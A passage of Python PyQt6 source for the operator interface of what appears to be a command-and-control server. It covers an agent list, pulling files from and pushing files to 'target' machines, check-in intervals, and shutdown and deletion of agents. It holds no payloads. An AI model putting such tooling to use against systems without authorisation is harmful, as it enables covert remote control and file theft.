        self.setup_table()
        self.setSizePolicy(QSizePolicy.Policy.Fixed, QSizePolicy.Policy.Expanding)
        FontManager().add_relative_font_widget(self, 0)

    def sizeHint(self):
        width = sum([self.horizontalHeader().sectionSize(i) 
                    for i in range(self.columnCount())])
        height = self.verticalHeader().length() + self.horizontalHeader().height()
        
       
        calculated_width = min(width + 3, 800)  
        return QSize(calculated_width, height)

    def setup_table(self):
        self.setFont(QFont((QFontDatabase.families()[1])))
        self.setColumnCount(4)
        self.setHorizontalHeaderLabels(["Agent ID", "Computer Name", "Status", "Last Check-in"])
        self.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.horizontalHeader().setStretchLastSection(True)
        self.verticalHeader().setVisible(False)
        self.itemSelectionChanged.connect(self.on_selection_changed)
        
        
        # Disable the default selection highlight
        base_style = self.styleSheet()
        style = """
            QTableWidget::item:selected {
                background-color: #e3f2fd;
                color: black;  
            }
            QTableWidget::item:selected:focus {
                background-color: #e3f2fd;
                color: black;
            }
        """
        self.setStyleSheet(base_style + style)
        #self.resizeColumnsToContents()

    def update_agents(self, agents: list):
        current_selection = self.selected_agent_id
        self.setRowCount(0)  # Clear existing rows
        for agent in agents:
            row = self.rowCount()
            self.insertRow(row)
            
            # Add items to the row
            self.setItem(row, 0, QTableWidgetItem(agent['agent_id']))
            self.setItem(row, 1, QTableWidgetItem(agent['computer_name']))
            self.setItem(row, 2, QTableWidgetItem(agent['status']))
            self.setItem(row, 3, QTableWidgetItem(agent['last_checkin']))
            
            # Set status color
            status_item = self.item(row, 2)
            if agent['status'] == 'online':
                status_item.setBackground(QColor('#44e349'))  # Light green
            else:
                status_item.setBackground(QColor('#e34444'))  # Light red
                
            # If this is the selected agent, select the row
            if agent['agent_id'] == current_selection:
                self.selectRow(row)
        self.resizeColumnsToContents()
        self.horizontalHeader().setStretchLastSection(True)

    def on_selection_changed(self):
        selected_items = self.selectedItems()
        if selected_items:
            row = selected_items[0].row()
            new_agent_id = self.item(row, 0).text()
            
            # If clicking the same row again, don't change anything
            if new_agent_id == self.selected_agent_id:
                return
                
            self.selected_agent_id = new_agent_id
            self.agent_selected.emit(self.selected_agent_id)

    def highlight_selected_row(self):
        for row in range(self.rowCount()):
            agent_id_item = self.item(row, 0)
            for col in range(self.columnCount()):
                item = self.item(row, col)
                if item:
                    if agent_id_item.text() == self.selected_agent_id:
                        item.setBackground(QColor('#e3f2fd'))  # Light blue background
                    else:
                        # Reset background but maintain status color in status column
                        if col == 2:  # Status column
                            status = self.item(row, 2).text()
                            color = QColor('#44e349') if status == 'online' else QColor('#e34444')
                            item.setBackground(color)
                        else:
                            item.setBackground(QColor('#878a87'))

class FileTransferWidget(QWidget):
    """Widget for handling file transfers"""
    def __init__(self, agent_repository: AgentRepository):
        super().__init__()
        self.agent_repository = agent_repository
        self.current_agent_id = None
        FontManager().add_relative_font_widget(self, 0)
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        # Request from Agent
        top_group = QGroupBox("Request from Agent")
        top_layout = QHBoxLayout()
        
        self.file_path_input = QLineEdit()
        self.file_path_input.setPlaceholderText("File path")
        self.file_path_input.setToolTip(
            "Enter the full file path as it appears on the target system\n"
            "Example: C:\\Users\\Administrator\\Documents\\file.txt"
        )
        self.request_btn = QPushButton("Request")
        self.request_btn.clicked.connect(self.request_file)
        
        top_layout.addWidget(self.file_path_input)
        top_layout.addWidget(self.request_btn)
        top_group.setLayout(top_layout)
        
        # Send to Agent
        bottom_group = QGroupBox("Send to Agent")
        bottom_layout = QVBoxLayout()
        
        # Add button row for file operations
        button_layout = QHBoxLayout()
        self.browse_btn = QPushButton("Browse Files...")
        self.browse_btn.clicked.connect(self.browse_files)
        self.refresh_btn = QPushButton("Refresh")
        self.refresh_btn.clicked.connect(self.refresh_files)
        self.transfer_btn = QPushButton("Send")
        self.transfer_btn.clicked.connect(self.transfer_file)
        
        button_layout.addWidget(self.browse_btn)
        button_layout.addWidget(self.refresh_btn)
        button_layout.addStretch()
        button_layout.addWidget(self.transfer_btn)
        
        # Create file list table
        self.file_table = QTableWidget()
        self.file_table.setColumnCount(3)
        self.file_table.setHorizontalHeaderLabels(["Name", "Size", "Type"])
        self.file_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.file_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.file_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        
        # Set up the header and column sizes
        header = self.file_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Fixed)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Fixed)
        
        # Set minimum widths for the fixed columns
        self.file_table.setColumnWidth(1, 100)
        self.file_table.setColumnWidth(2, 80)
        
        # Add widgets to bottom layout
        bottom_layout.addLayout(button_layout)
        bottom_layout.addWidget(self.file_table)
        bottom_group.setLayout(bottom_layout)

        # Add styles
        base_style = top_group.styleSheet()
        style = """ 
            QGroupBox {
                background: qlineargradient(x1:0, y1:1, x2:0, y2:0, stop:0 #424242, stop:1 #232323);
            }
            QGroupBox::title {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #232323);                
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding-left: 2000px;
                padding-right: 2000px;
            }
        """
        top_group.setStyleSheet(base_style + style)
        bottom_group.setStyleSheet(base_style + style)
        
        # Add both sections to main layout
        layout.addWidget(top_group)
        layout.addWidget(bottom_group)
        self.setLayout(layout)
        
        self.refresh_files()

    def get_file_size_str(self, size_in_bytes: int) -> str:
        """Convert file size to human-readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_in_bytes < 1024:
                return f"{size_in_bytes:.1f} {unit}"
            size_in_bytes /= 1024
        return f"{size_in_bytes:.1f} TB"

    def get_file_type(self, filename: str) -> str:
        """Get file type description"""
        ext = Path(filename).suffix.lower()
        return ext[1:].upper() if ext else "File"

    def refresh_files(self):
        """Refresh the file list table"""
        self.file_table.setRowCount(0)
        try:
            files = Path(config.FILES_FOLDER).glob('*')
            for file_path in files:
                row = self.file_table.rowCount()
                self.file_table.insertRow(row)
                
                # File name
                self.file_table.setItem(row, 0, QTableWidgetItem(file_path.name))
                
                # File size
                size = file_path.stat().st_size
                size_item = QTableWidgetItem(self.get_file_size_str(size))
                size_item.setTextAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
                self.file_table.setItem(row, 1, size_item)
                
                # File type
                type_item = QTableWidgetItem(self.get_file_type(file_path.name))
                type_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                self.file_table.setItem(row, 2, type_item)
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Error loading files: {str(e)}")

    def browse_files(self):
        """Open system file browser"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select File to Send",
            str(Path.home()),  # Start in user's home directory
            "All Files (*.*)"
        )
        
        if file_path:
            try:
                # Copy selected file to files folder
                source_path = Path(file_path)
                dest_path = Path(config.FILES_FOLDER) / source_path.name
                
                # Ask for confirmation if file already exists
                if dest_path.exists():
                    reply = QMessageBox.question(
                        self,
                        "File Exists",
                        f"File {source_path.name} already exists. Replace it?",
                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                    )
                    if reply == QMessageBox.StandardButton.No:
                        return
                
                shutil.copy2(file_path, dest_path)
                self.refresh_files()
                
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Error copying file: {str(e)}")

    def transfer_file(self):
        """Transfer selected file to agent"""
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        selected_items = self.file_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "No file selected!")
            return

        filename = self.file_table.item(selected_items[0].row(), 0).text()
        try:
            source_path = Path(config.FILES_FOLDER) / filename
            
            if not source_path.exists():
                QMessageBox.warning(self, "Error", "File not found")
                return
            
            # Schedule download command
            agent = self.agent_repository.get_agent(self.current_agent_id)
            if agent:
                self.agent_repository.update_agent_command(
                    self.current_agent_id,
                    f"download_file {filename}"
                )
                QMessageBox.information(
                    self,
                    "Success", 
                    f"File transfer scheduled for agent {self.current_agent_id}"
                )
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Transfer error: {str(e)}")

    def request_file(self):
        """Request file from agent"""
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        file_path = self.file_path_input.text().strip()
        if not file_path:
            QMessageBox.warning(self, "Warning", "Please enter a file path!")
            return

        try:
            # Schedule upload command
            agent = self.agent_repository.get_agent(self.current_agent_id)
            if agent:
                self.agent_repository.update_agent_command(
                    self.current_agent_id,
                    f"upload_file {file_path}"
                )
                QMessageBox.information(
                    self,
                    "Success", 
                    f"File request scheduled for agent {self.current_agent_id}"
                )
                # Clear the input field after successful request
                self.file_path_input.clear()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Request error: {str(e)}")

    def set_agent(self, agent_id: str):
        self.current_agent_id = agent_id

class AgentSettingsWidget(QWidget):
    """Widget for managing agent settings and lifecycle"""
    def __init__(self, agent_repository: AgentRepository):
        super().__init__()
        self.agent_repository = agent_repository
        self.current_agent_id = None
        FontManager().add_relative_font_widget(self, 0)
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout()

        # Check-in Settings
        settings_group = QGroupBox()
        settings_layout = QHBoxLayout()
        
        interval_input = QLabel("Update Check-In: ")
        self.interval_input = QLineEdit()
        self.interval_input.setPlaceholderText("Interval (seconds)")
        self.interval_input.setToolTip(
            "Enter the new check in interval in seconds\n"
            "Example: 30"
        )
        self.UpdateCheckIn_btn = QPushButton("Update")
        self.UpdateCheckIn_btn.clicked.connect(self.send_UpdateCheckIn)
        
        settings_layout.addWidget(interval_input)
        settings_layout.addWidget(self.interval_input)
        settings_layout.addWidget(self.UpdateCheckIn_btn)
        settings_group.setLayout(settings_layout)

        # Agent Control
        control_group = QGroupBox()
        control_layout = QVBoxLayout()
        
        # Shutdown button
        self.shutdown_btn = QPushButton("Shutdown Agent")
        self.shutdown_btn.setMinimumHeight(40)  # Medium height
        self.shutdown_btn.setStyleSheet(self.styleSheet() + """
            QPushButton {
                background-color: #8B0000;
                color: white;
            }
            QPushButton:hover {
                background-color: #A00000;
            }
        """)
        self.shutdown_btn.clicked.connect(self.shutdown_agent)
        
        # Delete button
        self.delete_btn = QPushButton("Delete Agent")
        self.delete_btn.setMinimumHeight(50)  # Larger height
        self.delete_btn.setStyleSheet(self.styleSheet() + """
            QPushButton {
                background-color: #8B0000;
                color: white;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #A00000;
            }
        """)
        self.delete_btn.clicked.connect(self.delete_agent)

        control_layout.addWidget(self.shutdown_btn)
        control_layout.addWidget(self.delete_btn)
        control_group.setLayout(control_layout)

        # Add styles
        base_style = settings_group.styleSheet()
        style = """ 
                    QGroupBox {
                background: #303030
            }
            QGroupBox::title {              
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding-left: 2000px;
                padding-right: 2000px;
            }
        """
        settings_group.setStyleSheet(base_style + style)
        control_group.setStyleSheet(base_style + style)
        
        # Add sections to main layout
        layout.addWidget(settings_group)
        layout.addWidget(control_group)
        layout.addStretch()  # Pushes widgets to top
        self.setLayout(layout)

    def send_UpdateCheckIn(self):
        """Update agent check-in interval"""
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        try:
            interval = int(self.interval_input.text())

            command = f"execute_module|UpdateCheckIn|{interval}"

            self.agent_repository.update_agent_command(self.current_agent_id, command)
            QMessageBox.information(
                self,
                "Success",
                f"Check-in interval update scheduled for agent {self.current_agent_id}"
            )
            self.interval_input.clear()
        except ValueError:
            QMessageBox.warning(self, "Error", "Please enter a valid number of seconds")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Update error: {str(e)}")

    def shutdown_agent(self):
        """Shutdown the selected agent"""
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        reply = QMessageBox.question(
            self,
            "Confirm Shutdown",
            f"Are you sure you want to shutdown agent {self.current_agent_id}?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            try:
                # Placeholder for actual implementation
                self.agent_repository.update_agent_command(
                    self.current_agent_id,
                    "shutdown"
                )
                QMessageBox.information(
                    self,
                    "Success",
                    f"Shutdown command sent to agent {self.current_agent_id}"
                )
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Shutdown error: {str(e)}")

    def delete_agent(self):
        """Delete the selected agent"""
        if not self.current_agent_id:
            QMessageBox.warning(self, "Warning", "No agent selected!")
            return

        reply = QMessageBox.question(
            self,
            "Confirm Delete",
            f"Are you sure you want to delete agent {self.current_agent_id}?\nThis action cannot be undone.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            try:
                if self.agent_repository.delete_agent(self.current_agent_id):
                    QMessageBox.information(
                        self,
                        "Success",
                        f"Agent {self.current_agent_id} has been deleted"
                    )
                else:
                    QMessageBox.warning(
                        self,
                        "Error",
                        f"Agent {self.current_agent_id} not found"
                    )
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Delete error: {str(e)}")

    def set_agent(self, agent_id: str):
        """Set the current agent ID"""
        self.current_agent_id = agent_id

class FontManager:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.relative_font_widgets = []
            cls._instance.font_update_callbacks = []  
        return cls._instance

    def get_relative_style(self, widget: QWidget, size_difference: int = 0) -> str:
        """
        Returns a stylesheet with the relative font size while preserving existing styles
        
        Args:
            widget: The widget to modify
            size_difference: Points to add/subtract from base font size
        """
        app_font_size = QApplication.instance().font().pointSize()
        relative_size = app_font_size + size_difference
        
        # Get the widget's class name (e.g., 'QLabel')
        widget_type = widget.__class__.__name__
        
        # Get current stylesheet to preserve other styles
        current_style = widget.styleSheet()
        
        return current_style + f"""
            {widget_type} {{
                font-size: {relative_size}pt;
            }}
        """

    def add_relative_font_widget(self, widget: QWidget, size_difference: int = 0):
        """Keep track of widgets that need relative font updates"""
        self.relative_font_widgets.append((widget, size_difference))
        widget.setStyleSheet(self.get_relative_style(widget, size_difference))

    def update_all_relative_fonts(self):
        """Update all tracked widgets when app font changes"""
        for widget, size_difference in self.relative_font_widgets:
            widget.setStyleSheet(self.get_relative_style(widget, size_difference))
        
        # Call all registered callbacks
        for callback in self.font_update_callbacks:
            callback()

    def add_font_update_callback(self, callback):
        """Add a callback to be called when fonts are updated"""
        self.font_update_callbacks.append(callback)

class SettingsPage(QWidget):
    def __init__(self, config_manager: ConfigManager, 
                 server_manager: ServerManager,
                 parent: QWidget = None):
        super().__init__(parent)
        self.config_manager = config_manager
        self.server_manager = server_manager
        FontManager().add_relative_font_widget(self, 0)

        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout(self)
        
        # Font Settings Group
        font_group = QGroupBox("Font Size")
        font_layout = QVBoxLayout()
        
        # Font size spinner and apply button
        font_size_layout = QHBoxLayout()
        
        self.font_size_spinner = QSpinBox()
        self.font_size_spinner.setRange(8, 32)
        self.font_size_spinner.setValue(QApplication.instance().font().pointSize())
        
        self.apply_font_button = QPushButton("Apply")
        self.apply_font_button.clicked.connect(self.on_font_size_changed)
        
        font_size_layout.addWidget(self.font_size_spinner)
        font_size_layout.addWidget(self.apply_font_button)
        font_size_layout.addStretch()
        font_layout.addLayout(font_size_layout)
        font_group.setLayout(font_layout)
        
        # Port Settings Group
        port_group = QGroupBox("Server Listener Port")
        base_style = port_group.styleSheet()
        style = """ 
            QGroupBox {
                background: qlineargradient(x1:0, y1:1, x2:0, y2:0, stop:0 #424242, stop:1 #232323);
            }
            QGroupBox::title {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #424242, stop:1 #232323);                
                padding-right: 2000px;
            }
        """
        #232323
        port_group.setStyleSheet(base_style + style)
        font_group.setStyleSheet(base_style + style)

        port_layout = QVBoxLayout()
        
        # Port number input and apply button
        port_input_layout = QHBoxLayout()
        
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(config.COMBINED_PORT)
        
        self.apply_port_button = QPushButton("Apply")
        self.apply_port_button.clicked.connect(self.on_port_changed)
        
        port_input_layout.addWidget(self.port_input)
        port_input_layout.addWidget(self.apply_port_button)
        port_input_layout.addStretch()
        port_layout.addLayout(port_input_layout)
        port_group.setLayout(port_layout)
        
        # Add groups to main layout
        layout.addWidget(font_group)
        layout.addWidget(port_group)
        layout.addStretch()

    def on_font_size_changed(self):
        size = self.font_size_spinner.value()
        app = QApplication.instance()
        font = app.font()
        font.setPointSize(size)
        app.setFont(font)
        
        # Update all relative fonts
        FontManager().update_all_relative_fonts()
        
        self.config_manager.save_settings(self.port_input.value(), size)
        
    def on_port_changed(self):
        port = self.port_input.value()
        
        success = self.server_manager.change_port(port)
        
        if success:
            self.config_manager.save_settings(port, self.font_size_spinner.value())
            QMessageBox.information(self, "Success", f"Server port changed to {port}")
        else:
            QMessageBox.critical(self, "Error", "Failed to change port")
            self.port_input.setValue(config.COMBINED_PORT)

class NavigationMenu(QWidget):
    """Collapsible navigation menu widget"""
    nav_changed = pyqtSignal(str)  # Signal when navigation item is selected
    doc_panel_toggled = pyqtSignal(bool)
    
    def __init__(self):
        super().__init__()
        self.expanded = True
        self.current_page = "agents"
        self.min_width = 35
        self.max_width = 165  # temporary initial value
        self.button_texts = {}
        
        font_manager = FontManager()
        font_manager.add_relative_font_widget(self, 0)
        font_manager.add_font_update_callback(self.update_font_and_width)
        
        self.setMinimumWidth(self.max_width)
        self.setup_ui()
        
        # Now calculate max width after buttons are created
        self.max_width = self.calculate_max_width()
        self.setMinimumWidth(self.max_width)
        self.setMaximumWidth(self.max_width)
        
    def setup_ui(self):
        self.setMaximumWidth(self.max_width)
        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(2)
        
        # Navigation buttons including toggle
        self.nav_buttons = {}
        nav_items = {
            "toggle": ("Hide", QStyle.StandardPixmap.SP_ArrowLeft),
            "agents": ("Agents", QStyle.StandardPixmap.SP_ComputerIcon),
            "settings": ("Settings", QStyle.StandardPixmap.SP_FileDialogListView),
            "docs": ("Documentation", QStyle.StandardPixmap.SP_FileDialogDetailedView),  
        }
        
        for nav_id, (text, icon) in nav_items.items():
            btn = QPushButton()
            btn.setIcon(QIcon(self.style().standardIcon(icon)))
            btn.setText(text)
            
            if nav_id == "toggle":
                btn.clicked.connect(self.toggle_menu)
            elif nav_id == "docs":
                btn.setCheckable(True)
                btn.clicked.connect(self.toggle_documentation)
            else:
                btn.setCheckable(True)
                btn.clicked.connect(lambda checked, x=nav_id: self.nav_changed.emit(x))
            
            self.nav_buttons[nav_id] = btn
            self.button_texts[nav_id] = text
            layout.addWidget(btn)
            
        layout.addStretch()
        self.setLayout(layout)
        
        # Set initial state
        self.nav_buttons["agents"].setChecked(True)
        self.set_style()

    def toggle_documentation(self):
        """Handle documentation panel toggle button clicks"""
        is_checked = self.nav_buttons["docs"].isChecked()
        self.doc_panel_toggled.emit(is_checked)
        
    def set_style(self):
        base_style = self.styleSheet()
        style = """
            QPushButton {
                text-align: left;
                padding: 10px;
                border: none;
                border-radius: 0;
            }
            QPushButton:checked {
                background-color: #404040;
            }
            QPushButton:hover:!checked {
                background-color: #353535;
            }
        """
        self.setStyleSheet(base_style + style)
        
    def toggle_menu(self):
        self.expanded = not self.expanded
        new_width = self.max_width if self.expanded else self.min_width
        
        # Create animations
        self.max_animation = QPropertyAnimation(self, b"maximumWidth")
        self.max_animation.setDuration(200)
        self.max_animation.setStartValue(self.width())
        self.max_animation.setEndValue(new_width)
        
        self.min_animation = QPropertyAnimation(self, b"minimumWidth")
        self.min_animation.setDuration(200)
        self.min_animation.setStartValue(self.width())
        self.min_animation.setEndValue(new_width)
        
        # Update button texts
        for nav_id, btn in self.nav_buttons.items():
            btn.setText(self.button_texts[nav_id] if self.expanded else "")
        
        # Update toggle button icon and text
        toggle_icon = QStyle.StandardPixmap.SP_ArrowLeft if self.expanded else QStyle.StandardPixmap.SP_ArrowRight
        toggle_text = "Hide" if self.expanded else "Expand"
        self.nav_buttons["toggle"].setIcon(QIcon(self.style().standardIcon(toggle_icon)))
        self.button_texts["toggle"] = toggle_text
        if self.expanded:
            self.nav_buttons["toggle"].setText(toggle_text)

        # Start animations
        self.max_animation.start()
        self.min_animation.start()

    def set_current_page(self, page_id: str):
        """Update the selected navigation button"""
        for nav_id, btn in self.nav_buttons.items():
            if nav_id != "toggle":  # Don't affect toggle button
                btn.setChecked(nav_id == page_id)

    def calculate_max_width(self):
        max_width = self.min_width
        font_metrics = QFontMetrics(self.font())
        
        # Account for padding and icon
        padding = 20  # 10px padding on each side 
        icon_width = 20  # Approximate icon width
        
        for nav_id, btn in self.nav_buttons.items():
            text_width = font_metrics.horizontalAdvance(self.button_texts[nav_id])
            button_width = text_width + padding + icon_width
            max_width = max(max_width, button_width)
        
        return max_width
    
    def update_font_and_width(self):
        """Called when font changes to update both font and recalculate width"""
        self.max_width = self.calculate_max_width()
        if self.expanded:
            self.setMinimumWidth(self.max_width)
            self.setMaximumWidth(self.max_width)

class DocumentationPanel(QWidget):
    def __init__(self, doc_manager: DocumentationManager):
        super().__init__()
        self.doc_manager = doc_manager
        self.expanded = False
        self.min_width = 0
        self.default_width = 500
        self.max_width = 900
        self.current_width = self.default_width
        self.font_manager = FontManager()
        self.resize_active = False
        
        self.header_colors = {
            1: '#fb713f',  #FF7F50
            2: '#2dd35f',  #A164F9
            3: '#2dd35f',  
            4: '#ff4d4d',  
            5: '#4ECDC4'   
        }
        
        self.setup_ui()
        self.setup_font_handling()
        
        self.setMaximumWidth(self.min_width)
        self.setFixedWidth(self.min_width)
        
    def setup_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        
        self.doc_view = QTextEdit()
        self.doc_view.setReadOnly(True)
        self.doc_view.setStyleSheet("""
            QTextEdit {
                background-color: #232323;
                border: none;
            }
        """)
        
        # Add resize handle area with visual indicator
        self.resize_area = QWidget()
        self.resize_area.setFixedWidth(12)
        self.resize_area.setCursor(Qt.CursorShape.SizeHorCursor)

        # Create grip layout
        grip_layout = QVBoxLayout()
        grip_layout.setContentsMargins(4, 0, 4, 0)
        grip_layout.setSpacing(2)

        # Add dot indicators to the center of the resize area
        dots_container = QWidget()
        dots_layout = QVBoxLayout()
        dots_layout.setContentsMargins(0, 0, 0, 0)
        dots_layout.setSpacing(4)

        for _ in range(5):
            dot = QFrame()
            dot.setFixedSize(2, 2)
            dot.setStyleSheet("""
                QFrame {
                    background-color: #666666;
                    border-radius: 1px;
                }
            """)
            dots_layout.addWidget(dot, alignment=Qt.AlignmentFlag.AlignCenter)

        # Add stretchers to center the dots vertically
        dots_layout.addStretch()
        dots_layout.insertStretch(0)

        dots_container.setLayout(dots_layout)
        grip_layout.addWidget(dots_container)
        self.resize_area.setLayout(grip_layout)

        self.resize_area.setStyleSheet("""
            QWidget {
                background-color: #232323;
                border: none;
            }
        """)
        
        container = QHBoxLayout()
        container.setContentsMargins(0, 0, 0, 0)
        container.setSpacing(0)
        container.addWidget(self.doc_view)
        container.addWidget(self.resize_area)
        
        layout.addLayout(container)
        self.setLayout(layout)
        
        self.resize_area.mousePressEvent = self.start_resize
        self.resize_area.mouseReleaseEvent = self.stop_resize
        self.resize_area.mouseMoveEvent = self.do_resize

    def setup_font_handling(self):
        # Store the original content for reformatting
        self.original_content = ""
        self.font_manager.add_relative_font_widget(self.doc_view, -2)
        self.font_manager.add_font_update_callback(self.refresh_formatting)

    def convert_markdown_to_rich_text(self, markdown_text: str):
        self.original_content = markdown_text
        self.doc_view.clear()
        cursor = self.doc_view.textCursor()
        
        app_font_size = QApplication.instance().font().pointSize()
        base_size = app_font_size - 2

        # Line spacing configuration
        HEADER_LINE_HEIGHT = 125
        CODE_LINE_HEIGHT = 100
        NORMAL_LINE_HEIGHT = 110
        PROPORTIONAL_HEIGHT = 1  # PyQt6 constant for proportional height

        size_adjustments = {1: 10, 2: 8, 3: 7, 4: 6, 5: 4}

        blocks = []
        current_block = []
        in_code_block = False
        
        for line in markdown_text.split('\n'):
            if line.strip().startswith('```'):
                if in_code_block:
                    current_block.append(line)
                    blocks.append(('\n'.join(current_block), 'code_block'))
                    current_block = []
                    in_code_block = False
                else:
                    if current_block:
                        blocks.append(('\n'.join(current_block), 'normal'))
                    current_block = [line]
                    in_code_block = True
            else:
                current_block.append(line)
        
        if current_block:
            blocks.append(('\n'.join(current_block), 'normal'))

        for content, block_type in blocks:
            if block_type == 'code_block':
                lines = content.split('\n')
                code_content = '\n'.join(lines[1:-1])
                
                block_format = QTextBlockFormat()
                block_format.setBackground(QColor('#1E1E1E'))
                block_format.setTopMargin(0)
                block_format.setBottomMargin(0)
                block_format.setLeftMargin(20)
                block_format.setRightMargin(20)
                block_format.setLineHeight(CODE_LINE_HEIGHT, PROPORTIONAL_HEIGHT)
                cursor.setBlockFormat(block_format)
                
                code_format = QTextCharFormat()
                code_format.setFontFamily('Consolas')
                code_format.setFontPointSize(base_size)
                code_format.setForeground(QColor('#E0E0E0'))
                cursor.insertText(code_content, code_format)
                cursor.insertBlock()
            else:
                for line in content.split('\n'):
                    bullet_match = re.match(r'^(\s*)-\s+(.+)$', line)
                    if bullet_match:
                        indent_level = len(bullet_match.group(1)) // 2
                        content = bullet_match.group(2)
                        
                        block_format = QTextBlockFormat()
                        block_format.setTopMargin(4)
                        block_format.setBottomMargin(4)
                        block_format.setLeftMargin(20 * (indent_level + 1))
                        block_format.setTextIndent((base_size * -1))
                        block_format.setLineHeight(NORMAL_LINE_HEIGHT, PROPORTIONAL_HEIGHT)
                        cursor.setBlockFormat(block_format)
                        
                        bullet_format = QTextCharFormat()
                        bullet_format.setFontFamily(QFontDatabase.families()[0])
                        bullet_format.setFontPointSize(base_size)
                        bullet_format.setForeground(QColor('#F8F8F2'))
                        
                        cursor.insertText("• ", bullet_format)
                        
                        parts = re.split(r'(`[^`]+`|\*\*[^*]+\*\*)', content)
                        for part in parts:
                            code_match = re.match(r'`([^`]+)`', part)
                            bold_match = re.match(r'\*\*([^*]+)\*\*', part)
                            
                            if code_match:
                                code_format = QTextCharFormat()
                                code_format.setFontFamily(QFontDatabase.families()[1])
                                code_format.setFontPointSize(base_size - 1)
                                #code_format.setBackground(QColor('#1E1E1E'))
                                code_format.setForeground(QColor('#edc0c0'))
                                cursor.insertText(code_match.group(1), code_format)
                            elif bold_match:
                                bold_format = QTextCharFormat()
                                bold_format.setFontPointSize(base_size)
                                bold_format.setFontWeight(QFont.Weight.Bold)
                                bold_format.setForeground(QColor('#F8F8F2'))
                                cursor.insertText(bold_match.group(1), bold_format)
                            else:
                                text_format = QTextCharFormat()
                                text_format.setFontPointSize(base_size)
                                text_format.setFontFamily(QFontDatabase.families()[0])
                                text_format.setForeground(QColor('#F8F8F2'))
                                cursor.insertText(part, text_format)
                        
                        cursor.insertBlock()
                        continue
                    
                    header_match = re.match(r'^(#{1,5})\s+(.+)$', line)
                    if header_match:
                        level = len(header_match.group(1))
                        content = header_match.group(2)
                        
                        block_format = QTextBlockFormat()
                        block_format.setTopMargin(10)
                        block_format.setBottomMargin(4)
                        block_format.setLineHeight(HEADER_LINE_HEIGHT, PROPORTIONAL_HEIGHT)
                        cursor.setBlockFormat(block_format)
                        
                        # Create and configure a QFont object
                        header_font = QFont()
                        header_font.setFamily(QFontDatabase.families()[2])
                        header_font.setPointSize(base_size + size_adjustments.get(level, 0))
                        header_font.setWeight(QFont.Weight.Bold)
                        
                        char_format = QTextCharFormat()
                        char_format.setFont(header_font)
                        char_format.setForeground(QColor(self.header_colors[level]))
                        
                        cursor.insertText(content, char_format)
                        cursor.insertBlock()
                        continue
                    
                    block_format = QTextBlockFormat()
                    block_format.setTopMargin(8)
                    block_format.setBottomMargin(8)
                    block_format.setLineHeight(NORMAL_LINE_HEIGHT, PROPORTIONAL_HEIGHT)
                    cursor.setBlockFormat(block_format)
                    
                    parts = re.split(r'(`[^`]+`|\*\*[^*]+\*\*)', line)
                    for part in parts:
                        code_match = re.match(r'`([^`]+)`', part)
                        bold_match = re.match(r'\*\*([^*]+)\*\*', part)
                        
                        if code_match:
                            code_format = QTextCharFormat()
                            code_format.setFontFamily(QFontDatabase.families()[1])
                            code_format.setFontPointSize(base_size - 1)
                            #code_format.setBackground(QColor('#1E1E1E'))
                            code_format.setForeground(QColor('#edc0c0'))
                            cursor.insertText(code_match.group(1), code_format)
                        elif bold_match:
                            bold_format = QTextCharFormat()
                            bold_format.setFontPointSize(base_size)
                            bold_format.setFontWeight(QFont.Weight.Bold)
                            bold_format.setFontFamily(QFontDatabase.families()[0])
                            bold_format.setForeground(QColor('#F8F8F2'))
                            cursor.insertText(bold_match.group(1), bold_format)
                        else:
                            text_format = QTextCharFormat()
                            text_format.setFontPointSize(base_size)
                            text_format.setFontFamily(QFontDatabase.families()[0])
                            text_format.setForeground(QColor('#F8F8F2'))
                            cursor.insertText(part, text_format)
                    
                    if line.strip():
                        cursor.insertBlock()

    def refresh_formatting(self):
        if hasattr(self, 'original_content') and self.original_content:
            self.convert_markdown_to_rich_text(self.original_content)

    def set_content(self, section_name: str):
        content = self.doc_manager.get_section(section_name)
